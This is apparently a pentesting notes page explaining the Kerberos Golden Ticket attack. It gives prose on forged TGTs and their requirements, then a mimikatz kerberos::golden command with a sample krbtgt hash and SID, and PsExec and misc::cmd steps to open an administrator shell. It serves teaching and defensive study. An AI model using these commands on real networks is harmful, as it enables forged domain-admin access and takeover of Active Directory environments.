# Golden Ticket

## Intro

Golden Ticket Attack is also a good example of the Pass the Ticket Attack.  the most infamous kerberos attack is known as the Golden Ticket which obviously is a kerberos ticket but with some differences.

{% hint style="info" %}
in order to create a valid TGT \(with a valid PAC\) we would require the target LT key and the KDC LT key. in case of a TGT these keys are identical \(krbtgt\). we would thus have to obtain the NTLM hash of the krbtgt account \(RC4\) or the AES key.
{% endhint %}

when we would use a golden ticket the first interaction is a TGS-REQ for a service ticket using the forged TGT \(golden ticket\). there is no prior credential submission or AS\_REQ/AS-REP.

the difference between a golden ticket and other tickets \(including the silver ticket \) is:

1. its created without any interaction with the DC. this is possible because kerberos is a stateless protocol so it does not keep track of all previously created TGTs.
2. it would require us to obtain the KDC long-term key \(which is not easy to get\)
3. its typically a TGT for an administrative account \(RID 500 in a domain or domain administrator\)
4. its typically valid for a long time \(10 years by default\)

## Creating a Golden Ticket

**with mimikatz we can create a Golden Ticket if we have the following information:**

**KDC LT key \(e.g: krbtgt NTLM hash\)**

**Domain admin account name**

**SID of domain admin account**



#### all of these values can be obtained by any user in the domain except for KDC LT key.

assuming that we got access to administrator NTLM hash, we can move on with the attack.

```text
kerberos::golden /user:client1 /domain:megacorp.local /sid:S-1-5-21-4081310294-3909750490-1069944866 /krbtgt:43e603fc59a5705d8a9f7c1c0a45b85e /id:500 /ptt
```

![](../../../.gitbook/assets/image%20%28200%29.png)

now we can get a shell with admin privileges:

```text
misc::cmd
```

![](../../../.gitbook/assets/image%20%28201%29.png)

or using psexe:

```text
PsExec64.exe \\192.168.1.105 cmd.exe
```

